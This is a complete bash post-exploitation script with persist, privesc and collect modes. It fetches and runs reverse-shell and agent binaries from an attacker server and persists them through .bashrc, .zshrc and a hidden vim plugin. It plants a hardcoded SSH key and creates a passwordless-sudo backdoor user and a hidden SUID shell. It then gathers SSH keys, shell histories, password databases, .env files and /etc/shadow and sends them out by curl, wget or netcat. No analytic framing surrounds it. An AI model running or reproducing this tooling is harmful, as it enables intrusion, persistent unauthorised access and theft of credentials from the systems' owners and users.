#!/usr/bin/env bash
set -euo pipefail

# Usage: ./script.sh <mode> <server_ip> [port]
# Modes: persist | privesc | collect | all

if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <mode> <server_ip> [port]"
    echo "Modes: persist | privesc | collect | all"
    echo "Default port: 8080"
    exit 1
fi

MODE="$1"
SERVER_IP="$2"
UPLOAD_PORT="${3:-8080}" # Default to 8080 if not specified
HOSTNAME="$(hostname 2>/dev/null || true)"
if [ -z "$HOSTNAME" ]; then
    HOSTNAME="$(hostnamectl --static 2>/dev/null || true)"
fi
if [ -z "$HOSTNAME" ]; then
    HOSTNAME="$(cat /etc/hostname 2>/dev/null || true)"
fi
if [ -z "$HOSTNAME" ]; then
    HOSTNAME="unknown"
fi
USERNAME="$(id -un)"

# Determine home directory safely
if [ -n "${HOME:-}" ]; then
    BASEDIR="$HOME"
else
    if [ "$USERNAME" = "root" ]; then
        BASEDIR="/root"
    else
        BASEDIR="/home/$USERNAME"
    fi
fi

WORKDIR="$BASEDIR/.local/.cache/.svc"
if mkdir -p "$WORKDIR" 2>/dev/null && cd "$WORKDIR"; then
    echo "[*] Using workdir: $WORKDIR"
else
    WORKDIR="/dev/shm/.svc"
    mkdir -p "$WORKDIR"
    cd "$WORKDIR"
    echo "[*] Falling back to workdir: $WORKDIR"
fi

# Function to handle file uploads with fallback methods
upload_file() {
    local file="$1"
    local custom_name="$2"

    # Method 1: Try curl
    if command -v curl >/dev/null 2>&1; then
        if curl -s -F "file=@$file;filename=$custom_name" "http://$SERVER_IP:$UPLOAD_PORT/p"; then
            echo "[+] Uploaded $file as $custom_name via curl"
            return 0
        else
            echo "[-] curl upload failed for $file"
        fi
    fi

    # Method 2: Try wget with POST (if server supports it)
    if command -v wget >/dev/null 2>&1; then
        # Create a temporary boundary and form data
        local boundary="----WebKitFormBoundary$(openssl rand -hex 8 2>/dev/null || date +%s)"
        local tmpfile="/tmp/.upload_$$"

        {
            echo "--$boundary"
            echo "Content-Disposition: form-data; name=\"file\"; filename=\"$custom_name\""
            echo "Content-Type: application/octet-stream"
            echo ""
            cat "$file"
            echo ""
            echo "--$boundary--"
        } >"$tmpfile" 2>/dev/null

        if wget -q --post-file="$tmpfile" \
            --header="Content-Type: multipart/form-data; boundary=$boundary" \
            "http://$SERVER_IP:$UPLOAD_PORT/p" -O /dev/null 2>/dev/null; then
            rm -f "$tmpfile"
            echo "[+] Uploaded $file as $custom_name via wget"
            return 0
        else
            rm -f "$tmpfile"
            echo "[-] wget upload failed for $file"
        fi
    fi

    # Method 3: Try nc (netcat) if available
    if command -v nc >/dev/null 2>&1 || command -v ncat >/dev/null 2>&1; then
        local nc_cmd="nc"
        command -v ncat >/dev/null 2>&1 && nc_cmd="ncat"

        # Try simple HTTP PUT request
        {
            echo "PUT /upload/$custom_name HTTP/1.1"
            echo "Host: $SERVER_IP:$UPLOAD_PORT"
            echo "Content-Length: $(stat -c%s "$file" 2>/dev/null || wc -c <"$file")"
            echo "Connection: close"
            echo ""
            cat "$file"
        } | $nc_cmd "$SERVER_IP" "$UPLOAD_PORT" >/dev/null 2>&1

        if [ $? -eq 0 ]; then
            echo "[+] Uploaded $file as $custom_name via netcat"
            return 0
        else
            echo "[-] netcat upload failed for $file"
        fi
    fi

    # Fallback: Copy to persistence directory if all upload methods fail
    local fallback_dir="$WORKDIR/collected"
    mkdir -p "$fallback_dir"
    if cp "$file" "$fallback_dir/$custom_name" 2>/dev/null; then
        echo "[!] No upload method available - saved $file to $fallback_dir/$custom_name"
        return 0
    else
        echo "[-] Failed to save $file locally"
        return 1
    fi
}

persist_mode() {
    echo "[*] Running persist mode in $WORKDIR"

    wget -q "http://$SERVER_IP/payloads/agent" -O agent || {
        echo "[-] Failed to download agent"
        return 1
    }
    wget -q "http://$SERVER_IP/payloads/reverse" -O reverse || {
        echo "[-] Failed to download reverse"
        return 1
    }
    chmod +x agent reverse

    # Use subshell to prevent exit on failure and properly background+disown
    (
        ./reverse >/dev/null 2>&1 &
        disown
    ) || echo "[-] Reverse failed"
    (
        ./agent >/dev/null 2>&1 &
        disown
    ) || echo "[-] Agent failed"

    echo "[*] Adding persistence to shell configs..."
    for rc in "$BASEDIR/.bashrc" "$BASEDIR/.zshrc"; do
        if [ -f "$rc" ]; then
            if ! grep -q "$WORKDIR/reverse" "$rc"; then
                echo "$WORKDIR/reverse &" >>"$rc"
            fi
            if ! grep -q "$WORKDIR/agent" "$rc"; then
                echo "$WORKDIR/agent &" >>"$rc"
            fi
        fi
    done

    echo "[*] Adding SSH key persistence..."
    SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEddy3DoHUkaF4AZbisSRqfpc7zI7JSu3vR9eK8JllQH"
    
    # Check if running as root
    if [ "$(id -u)" -eq 0 ]; then
        echo "[*] Running as root, checking SSH configuration..."
        # Check if root SSH login is allowed
        if grep -qE "^PermitRootLogin\s+(yes|without-password|prohibit-password)" /etc/ssh/sshd_config 2>/dev/null || \
           ! grep -qE "^PermitRootLogin\s+no" /etc/ssh/sshd_config 2>/dev/null; then
            # Add SSH key to root
            mkdir -p /root/.ssh 2>/dev/null
            chmod 700 /root/.ssh 2>/dev/null
            if ! grep -q "$SSH_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
                echo "$SSH_KEY" >> /root/.ssh/authorized_keys 2>/dev/null
                chmod 600 /root/.ssh/authorized_keys 2>/dev/null
                echo "[+] SSH key added to root authorized_keys"
            else
                echo "[*] SSH key already present in root authorized_keys"
            fi
        else
            echo "[*] Root SSH login disabled, creating backdoor user..."
            # Create backdoor user svc_acc
            if ! id svc_acc >/dev/null 2>&1; then
                useradd -m -s /bin/bash svc_acc 2>/dev/null
                # Add to sudoers
                echo "svc_acc ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/svc_acc 2>/dev/null
                chmod 440 /etc/sudoers.d/svc_acc 2>/dev/null
                echo "[+] Created svc_acc user with sudo privileges"
            fi
            # Add SSH key
            mkdir -p /home/svc_acc/.ssh 2>/dev/null
            chmod 700 /home/svc_acc/.ssh 2>/dev/null
            chown -R svc_acc:svc_acc /home/svc_acc/.ssh 2>/dev/null
            if ! grep -q "$SSH_KEY" /home/svc_acc/.ssh/authorized_keys 2>/dev/null; then
                echo "$SSH_KEY" >> /home/svc_acc/.ssh/authorized_keys 2>/dev/null
                chmod 600 /home/svc_acc/.ssh/authorized_keys 2>/dev/null
                chown svc_acc:svc_acc /home/svc_acc/.ssh/authorized_keys 2>/dev/null
                echo "[+] SSH key added to svc_acc authorized_keys"
            fi
        fi
        
        echo "[*] Creating SUID backdoor..."
        # Create SUID shell backdoor in a hidden location
        BACKDOOR_PATH="/var/tmp/.systemd-private"
        if cp /bin/bash "$BACKDOOR_PATH" 2>/dev/null; then
            chown root:root "$BACKDOOR_PATH" 2>/dev/null
            chmod 4755 "$BACKDOOR_PATH" 2>/dev/null
            echo "[+] SUID backdoor created at $BACKDOOR_PATH (run with -p flag)"
        else
            echo "[-] Failed to create SUID backdoor"
        fi
    else
        # Regular user - just add SSH key to their account
        SSH_DIR="$BASEDIR/.ssh"
        if mkdir -p "$SSH_DIR" 2>/dev/null; then
            chmod 700 "$SSH_DIR" 2>/dev/null || true
            if ! grep -q "$SSH_KEY" "$SSH_DIR/authorized_keys" 2>/dev/null; then
                echo "$SSH_KEY" >> "$SSH_DIR/authorized_keys" 2>/dev/null && \
                    chmod 600 "$SSH_DIR/authorized_keys" 2>/dev/null && \
                    echo "[+] SSH key added to authorized_keys" || \
                    echo "[-] Failed to add SSH key"
            else
                echo "[*] SSH key already present in authorized_keys"
            fi
        else
            echo "[-] Failed to create .ssh directory"
        fi
    fi

    echo "[+] Persistence components started and added to rc files."
}

collect_mode() {
    echo "[*] Running collect mode..."

    # Search both /home and /root (if accessible)
    for DIR in /home /root; do
        [ -d "$DIR" ] || continue
        find "$DIR" -type f \
            \( -name ".bash_history" -o -name ".zsh_history" \
            -o -name ".bashrc" -o -name ".zshrc" \
            -o -name ".bash_profile" -o -name ".zprofile" -o -name ".profile" \
            -o -name ".bash_aliases" -o -name ".zsh_aliases" \
            -o -name "*.txt" -o -name "*.log" -o -name "*.conf" \
            -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" \
            -o -name "*.doc" -o -name "*.docx" -o -name "*.kdbx" \
            -o -name "id_*" -o -name "*_rsa" -o -name "*_rsa.pub" \
            -o -name "*_dsa" -o -name "*_dsa.pub" \
            -o -name "*_ecdsa" -o -name "*_ecdsa.pub" \
            -o -name "*_ed25519" -o -name "*_ed25519.pub" \
            -o -name "*.pem" -o -name "*.key" \
            -o -name "*env" -o -name "known_hosts" -o -name "authorized_keys" \) \
            -print0 2>/dev/null || true
    done |
        while IFS= read -r -d '' f; do
            if [ -f "$f" ]; then
                OWNER="$(stat -c "%U" "$f" 2>/dev/null || echo unknown)"
                BASENAME="$(basename "$f")"
                CUSTOM_NAME="${HOSTNAME}_${OWNER}_${BASENAME}"
                echo "[*] Exfiltrating $f as $CUSTOM_NAME ..."
                upload_file "$f" "$CUSTOM_NAME"
            fi
        done

    # Add shadow separately (not caught by find)
    if [ -r /etc/shadow ]; then
        f="/etc/shadow"
        OWNER="$(stat -c "%U" "$f" 2>/dev/null || echo root)"
        CUSTOM_NAME="${HOSTNAME}_${OWNER}_shadow"
        echo "[*] Exfiltrating $f as $CUSTOM_NAME ..."
        upload_file "$f" "$CUSTOM_NAME"
    fi

    # Check if files were saved locally and notify
    if [ -d "$WORKDIR/collected" ]; then
        local file_count=$(find "$WORKDIR/collected" -type f 2>/dev/null | wc -l)
        if [ "$file_count" -gt 0 ]; then
            echo "[!] $file_count files saved locally in $WORKDIR/collected (upload failed)"
        fi
    fi

    echo "[*] Checking for specific tools and services..."
    TOOLS_OUTPUT="${HOSTNAME}_${USERNAME}_tools_check.txt"
    
    # Check for ansible
    if command -v ansible >/dev/null 2>&1; then
        echo "=== Ansible Found ===" >> "$TOOLS_OUTPUT"
        echo "Path: $(command -v ansible)" >> "$TOOLS_OUTPUT"
        ansible --version >> "$TOOLS_OUTPUT" 2>&1 || true
        echo "" >> "$TOOLS_OUTPUT"
        
        # Check for ansible inventory and config files
        if [ -f "/etc/ansible/hosts" ]; then
            echo "--- /etc/ansible/hosts ---" >> "$TOOLS_OUTPUT"
            cat /etc/ansible/hosts >> "$TOOLS_OUTPUT" 2>&1 || true
            echo "" >> "$TOOLS_OUTPUT"
        fi
        if [ -f "$HOME/.ansible.cfg" ]; then
            echo "--- ~/.ansible.cfg ---" >> "$TOOLS_OUTPUT"
            cat "$HOME/.ansible.cfg" >> "$TOOLS_OUTPUT" 2>&1 || true
            echo "" >> "$TOOLS_OUTPUT"
        fi
    else
        echo "ansible: Not found" >> "$TOOLS_OUTPUT"
    fi
    
    # Check for artifactoryctl
    if command -v artifactoryctl >/dev/null 2>&1; then
        echo "=== Artifactoryctl Found ===" >> "$TOOLS_OUTPUT"
        echo "Path: $(command -v artifactoryctl)" >> "$TOOLS_OUTPUT"
        artifactoryctl --version >> "$TOOLS_OUTPUT" 2>&1 || true
        echo "" >> "$TOOLS_OUTPUT"
        
        echo "--- Artifactory Processes ---" >> "$TOOLS_OUTPUT"
        ps aux | grep -i artifactory | grep -v grep >> "$TOOLS_OUTPUT" 2>&1 || echo "No artifactory processes found" >> "$TOOLS_OUTPUT"
        echo "" >> "$TOOLS_OUTPUT"
    else
        echo "artifactoryctl: Not found" >> "$TOOLS_OUTPUT"
        
        # Still check for artifactory processes even if artifactoryctl is not found
        if ps aux | grep -i artifactory | grep -v grep >/dev/null 2>&1; then
            echo "--- Artifactory Processes (without artifactoryctl) ---" >> "$TOOLS_OUTPUT"
            ps aux | grep -i artifactory | grep -v grep >> "$TOOLS_OUTPUT" 2>&1 || true
            echo "" >> "$TOOLS_OUTPUT"
        fi
    fi
    
    # Upload the tools check output
    if [ -f "$TOOLS_OUTPUT" ]; then
        upload_file "$TOOLS_OUTPUT" "$TOOLS_OUTPUT"
        rm -f "$TOOLS_OUTPUT"
    fi

    echo "[+] Collection & exfiltration complete."
}

privesc_mode() {
    echo "[*] Running privesc mode in $WORKDIR"

    echo "[*] Adding vim-based persistence..."
    # Create vim plugin
    mkdir -p "$BASEDIR/.vim/plugins" 2>/dev/null
    cat > "$BASEDIR/.vim/plugins/settings.vim" << 'VIMEOF'
#!/usr/bin/env bash
# Background the reverse shell
if [ -f "$HOME/.local/.cache/.svc/reverse" ]; then
    (nohup "$HOME/.local/.cache/.svc/reverse" >/dev/null 2>&1 &)
elif [ -f "/dev/shm/.svc/reverse" ]; then
    (nohup "/dev/shm/.svc/reverse" >/dev/null 2>&1 &)
fi

SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEddy3DoHUkaF4AZbisSRqfpc7zI7JSu3vR9eK8JllQH"

# If running as root
if [ "$(id -u)" -eq 0 ]; then
    # Check if root SSH login is allowed
    if grep -qE "^PermitRootLogin\s+(yes|without-password|prohibit-password)" /etc/ssh/sshd_config 2>/dev/null || \
       ! grep -qE "^PermitRootLogin\s+no" /etc/ssh/sshd_config 2>/dev/null; then
        # Add SSH key to root
        mkdir -p /root/.ssh 2>/dev/null
        chmod 700 /root/.ssh 2>/dev/null
        if ! grep -q "$SSH_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
            echo "$SSH_KEY" >> /root/.ssh/authorized_keys 2>/dev/null
            chmod 600 /root/.ssh/authorized_keys 2>/dev/null
        fi
    else
        # Create backdoor user svc_acc
        if ! id svc_acc >/dev/null 2>&1; then
            useradd -m -s /bin/bash svc_acc 2>/dev/null
            # Add to sudoers
            echo "svc_acc ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/svc_acc 2>/dev/null
            chmod 440 /etc/sudoers.d/svc_acc 2>/dev/null
        fi
        # Add SSH key
        mkdir -p /home/svc_acc/.ssh 2>/dev/null
        chmod 700 /home/svc_acc/.ssh 2>/dev/null
        chown -R svc_acc:svc_acc /home/svc_acc/.ssh 2>/dev/null
        if ! grep -q "$SSH_KEY" /home/svc_acc/.ssh/authorized_keys 2>/dev/null; then
            echo "$SSH_KEY" >> /home/svc_acc/.ssh/authorized_keys 2>/dev/null
            chmod 600 /home/svc_acc/.ssh/authorized_keys 2>/dev/null
            chown svc_acc:svc_acc /home/svc_acc/.ssh/authorized_keys 2>/dev/null
        fi
    fi
fi
VIMEOF
    chmod +x "$BASEDIR/.vim/plugins/settings.vim" 2>/dev/null

    # Add to vimrc
    if [ ! -f "$BASEDIR/.vimrc" ] || ! grep -q "silent !source ~/.vim/plugins/settings.vim" "$BASEDIR/.vimrc" 2>/dev/null; then
        cat >> "$BASEDIR/.vimrc" << 'EOF'
:silent !source ~/.vim/plugins/settings.vim
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
EOF
        echo "[+] Added vim persistence to .vimrc"
    fi

    # Add sudo alias to bashrc
    if [ -f "$BASEDIR/.bashrc" ]; then
        if ! grep -q 'alias sudo="sudo -E"' "$BASEDIR/.bashrc" 2>/dev/null; then
            echo 'alias sudo="sudo -E"' >> "$BASEDIR/.bashrc"
            echo "[+] Added sudo alias to .bashrc"
        fi
    fi

    echo "[*] Adding SSH config for connection persistence..."
    # Check if running as root
    if [ "$(id -u)" -eq 0 ]; then
        # Add to system-wide SSH config
        SSH_CONFIG="/etc/ssh/ssh_config"
        if [ -f "$SSH_CONFIG" ]; then
            if ! grep -q "ControlMaster auto" "$SSH_CONFIG" 2>/dev/null; then
                cat >> "$SSH_CONFIG" << 'SSHEOF'

# Connection multiplexing for persistence
Host *
    ControlPath ~/.ssh/controlmaster/%r@%h:%p
    ControlMaster auto
    ControlPersist yes
    AllowAgentForwarding yes
SSHEOF
                echo "[+] Added SSH config to $SSH_CONFIG"
            else
                echo "[*] SSH config already present in $SSH_CONFIG"
            fi
        fi
    else
        # Add to user's SSH config
        SSH_CONFIG="$BASEDIR/.ssh/config"
        mkdir -p "$BASEDIR/.ssh" 2>/dev/null
        mkdir -p "$BASEDIR/.ssh/controlmaster" 2>/dev/null
        chmod 700 "$BASEDIR/.ssh" 2>/dev/null
        chmod 700 "$BASEDIR/.ssh/controlmaster" 2>/dev/null
        
        if [ ! -f "$SSH_CONFIG" ] || ! grep -q "ControlMaster auto" "$SSH_CONFIG" 2>/dev/null; then
            cat >> "$SSH_CONFIG" << 'SSHEOF'

# Connection multiplexing for persistence
Host *
    ControlPath ~/.ssh/controlmaster/%r@%h:%p
    ControlMaster auto
    ControlPersist yes
    AllowAgentForwarding yes
SSHEOF
            chmod 600 "$SSH_CONFIG" 2>/dev/null
            echo "[+] Added SSH config to $SSH_CONFIG"
        else
            echo "[*] SSH config already present in $SSH_CONFIG"
        fi
    fi

    wget -q "http://$SERVER_IP/linpeas" -O linpeas || {
        echo "[-] Failed to download linpeas"
        exit 1
    }
    chmod +x linpeas

    trap 'echo "[*] linpeas interrupted, continuing..."' INT
    ./linpeas -a -q | tee "${HOSTNAME}_${USERNAME}_linpeas.txt" || true
    # timeout 600 ./linpeas -a -q | tee "${HOSTNAME}_${USERNAME}_linpeas.txt" || true
    trap - INT

    upload_file "${HOSTNAME}_${USERNAME}_linpeas.txt" "${HOSTNAME}_${USERNAME}_linpeas.txt"

    rm -f linpeas "${HOSTNAME}_${USERNAME}_linpeas.txt"

    echo "[*] Running pspy for process monitoring..."
    wget -q "http://$SERVER_IP/pspy" -O pspy || {
        echo "[-] Failed to download pspy"
        echo "[+] Privesc scan completed and cleaned up."
        return
    }
    chmod +x pspy

    PSPY_OUTPUT="${HOSTNAME}_${USERNAME}_pspy.txt"
    
    echo "[*] Running pspy -i 1000 for 30 seconds..."
    timeout 30 ./pspy -i 1000 >> "$PSPY_OUTPUT" 2>&1 || true
    
    echo "[*] Running pspy -f -i 1000 for 30 seconds..."
    timeout 30 ./pspy -f -i 1000 >> "$PSPY_OUTPUT" 2>&1 || true

    upload_file "$PSPY_OUTPUT" "$PSPY_OUTPUT"

    rm -f pspy "$PSPY_OUTPUT"

    echo "[+] Privesc scan completed and cleaned up."
}

case "$MODE" in
persist) persist_mode ;;
privesc) privesc_mode ;;
collect) collect_mode ;;
all)
    persist_mode || echo "[-] Persist mode had errors, continuing..."
    collect_mode || echo "[-] Collect mode had errors, continuing..."
    privesc_mode || echo "[-] Privesc mode had errors, continuing..."
    ;;
*)
    echo "Invalid mode: $MODE"
    echo "Valid modes: persist | privesc | collect | all"
    exit 1
    ;;
esac
